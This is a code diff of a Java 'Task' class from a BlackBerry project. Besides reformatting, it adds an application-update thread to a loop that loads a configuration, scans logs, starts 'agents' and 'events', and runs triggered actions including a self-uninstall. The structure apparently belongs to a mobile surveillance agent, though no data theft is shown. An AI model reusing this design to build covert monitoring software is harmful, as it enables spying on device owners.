@@ -23,162 +23,203 @@ import blackberry.utils.Utils;
  */
 public class Task {
 
-    private static final int SLEEPING_TIME = 1000;
+	private static final int SLEEPING_TIME = 1000;
 
-    /** The debug instance. */
-    //#debug
-    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
+	/** The debug instance. */
+	// #debug
+	private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
 
-    /** The conf. */
-    Conf conf = null;
+	/** The conf. */
+	Conf conf;
 
-    /** The status. */
-    Status status = null;
+	/** The status. */
+	Status status;
 
-    /** The device. */
-    Device device = null;
+	/** The device. */
+	Device device;
 
-    /** The log collector. */
-    LogCollector logCollector = null;
+	/** The log collector. */
+	LogCollector logCollector;
 
-    /** The event manager. */
-    EventManager eventManager = null;
+	/** The event manager. */
+	EventManager eventManager;
 
-    /** The agent manager. */
-    AgentManager agentManager = null;
+	/** The agent manager. */
+	AgentManager agentManager;
 
-    /**
-     * Instantiates a new task.
-     */
-    public Task() {
-        // Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le
-        // code
-        status = Status.getInstance();
-        device = Device.getInstance();
-        logCollector = LogCollector.getInstance();
+	Thread applicationThread;
+	AppUpdateManager appUpdateManager;
 
-        eventManager = EventManager.getInstance();
-        agentManager = AgentManager.getInstance();
-    }
+	// ApplicationUpdateTask();
 
-    /**
-     * Check actions.
-     * 
-     * @return true, if successful
-     */
-    public synchronized boolean checkActions() {
-        Utils.sleep(1000);
+	/**
+	 * Instantiates a new task.
+	 */
+	public Task() {
+		status = Status.getInstance();
+		device = Device.getInstance();
+		logCollector = LogCollector.getInstance();
 
-        for (;;) {
+		eventManager = EventManager.getInstance();
+		agentManager = AgentManager.getInstance();
+		appUpdateManager = AppUpdateManager.getInstance();
+		
+		// #debug debug
+		debug.trace("Task created");
+	}
 
-            debug.trace("checkActions");
-            final int[] actionIds = this.status.getActionIdTriggered();
+	/**
+	 * Check actions.
+	 * 
+	 * @return true, if successful
+	 */
+	public synchronized boolean checkActions() {
+		Utils.sleep(1000);
 
-            final int asize = actionIds.length;
-            if (asize > 0) {
+		for (;;) {
+			// #debug debug
+			debug.trace("checkActions");
+			final int[] actionIds = this.status.getActionIdTriggered();
 
-                for (int k = 0; k < asize; ++k) {
-                    final int actionId = actionIds[k];
-                    final Action action = status.getAction(actionId);
+			final int asize = actionIds.length;
+			if (asize > 0) {
 
-                    if (action.isTriggered() == false) {
-                        //#debug
-                        debug.warn("Should be triggered");
-                        continue;
-                    }
+				for (int k = 0; k < asize; ++k) {
+					final int actionId = actionIds[k];
+					final Action action = status.getAction(actionId);
 
-                    // #debug
-                    debug.trace("CheckActions() triggered" + action);
-                    action.setTriggered(false, null);
+					if (action.isTriggered() == false) {
+						// #debug
+						debug.warn("Should be triggered");
+						continue;
+					}
 
-                    final Vector subActions = action.getSubActionsList();
+					// #debug debug
+					debug.trace("CheckActions() triggered" + action);
+					action.setTriggered(false, null);
 
-                    final int ssize = subActions.size();
-                    for (int j = 0; j < ssize; ++j) {
+					final Vector subActions = action.getSubActionsList();
 
-                        final SubAction subAction = (SubAction) subActions
-                                .elementAt(j);
-                        final boolean ret = subAction.execute(action
-                                .getTriggeringEvent());
+					final int ssize = subActions.size();
+					for (int j = 0; j < ssize; ++j) {
 
-                        if (ret == false) {
-                            //#debug
-                            debug.warn("CheckActions() error executing: "+subAction);
-                            break;
-                        }
+						final SubAction subAction = (SubAction) subActions
+								.elementAt(j);
+						final boolean ret = subAction.execute(action
+								.getTriggeringEvent());
 
-                        if (subAction.wantUninstall()) {
-                            // #debug
-                            debug.warn("CheckActions() uninstalling");
-                            agentManager.stopAll();
-                            eventManager.stopAll();
-                            return false;
-                        }
+						if (ret == false) {
+							// #debug
+							debug.warn("CheckActions() error executing: "
+									+ subAction);
+							break;
+						}
 
-                        if (subAction.wantReload()) {
-                            // #debug
-                            debug.warn("CheckActions() reloading");
-                            agentManager.stopAll();
-                            eventManager.stopAll();
-                            return true;
-                        }
-                    }
-                }
-            }
-            Utils.sleep(SLEEPING_TIME);
-        }
+						if (subAction.wantUninstall()) {
+							// #debug
+							debug.warn("CheckActions() uninstalling");
+							agentManager.stopAll();
+							eventManager.stopAll();
+							return false;
+						}
 
-    }
+						if (subAction.wantReload()) {
+							// #debug
+							debug.warn("CheckActions() reloading");
+							agentManager.stopAll();
+							eventManager.stopAll();
+							return true;
+						}
+					}
+				}
+			}
+			Utils.sleep(SLEEPING_TIME);
+		}
 
-    /**
-     * Task init.
-     * 
-     * @return true, if successful
-     */
-    public boolean taskInit() {
-        // #debug
-        debug.trace("TaskInit");
+	}
 
-        agentManager.stopAll();
-        eventManager.stopAll();
+	/**
+	 * Task init.
+	 * 
+	 * @return true, if successful
+	 */
+	public boolean taskInit() {
+		// #debug debug
+		debug.trace("TaskInit");
 
-        if (device != null) {
-            device.refreshData();
-        }
+		agentManager.stopAll();
+		eventManager.stopAll();
 
-        conf = new Conf();
+		if (device != null) {
+			device.refreshData();
+		}
 
-        if (conf.load() == false) {
-            // #debug
-            debug.trace("TaskInit - Load Conf FAILED");
+		conf = new Conf();
 
-            return false;
-        }
+		if (conf.load() == false) {
+			// #debug debug
+			debug.trace("TaskInit - Load Conf FAILED");
 
-        Msg.demo("Configuration... OK\n");
+			return false;
+		}
 
-        if (logCollector != null) {
-            logCollector.scanLogs();
-        }
+		Msg.demo("Configuration... OK\n");
 
-        // Da qui in poi inizia la concorrenza dei thread
-        if (eventManager.startAll() == false) {
-            // #debug
-            debug.trace("TaskInit - eventManager FAILED");
-            return false;
-        }
+		if (logCollector != null) {
+			logCollector.scanLogs();
+		}
 
-        // #debug
-        debug.info("TaskInit - agents started");
+		// Da qui in poi inizia la concorrenza dei thread
 
-        if (agentManager.startAll() == false) {
-            // #debug
-            debug.trace("TaskInit - agentManager FAILED");
-            return false;
-        }
+		// #debug debug
+		debug.trace("going to start ApplicationTimer");
+		startApplicationTimer();
 
-        // #debug
-        debug.info("TaskInit - agents started");
-        return true;
-    }
+		if (eventManager.startAll() == false) {
+			// #debug debug
+			debug.trace("TaskInit - eventManager FAILED");
+			return false;
+		}
+
+		// #debug info
+		debug.info("TaskInit - agents started");
+
+		if (agentManager.startAll() == false) {
+			// #debug debug
+			debug.trace("TaskInit - agentManager FAILED");
+			return false;
+		}
+
+		// #debug info
+		debug.info("TaskInit - agents started");
+		return true;
+	}
+
+	void stopApplicationTimer() {
+		if (applicationThread != null) {
+			// applicationTimer.cancel();
+			// applicationTimer = null;
+			appUpdateManager.stop();
+			try {
+				applicationThread.join();
+				appUpdateManager = null;
+			} catch (InterruptedException e) {
+			}
+		}
+	}
+
+	synchronized void startApplicationTimer() {
+		// applicationTimer = new Timer();
+		try {
+			
+			applicationThread = new Thread(appUpdateManager);
+			applicationThread.start();
+		} catch (Exception ex) {
+			// #debug
+			debug.error("startApplicationTimer: " + ex);
+
+		}
+		// applicationTimer.schedule(applicationUpdateTask, 5000,
+		// APP_TIMER_DELAY);
+	}
 }
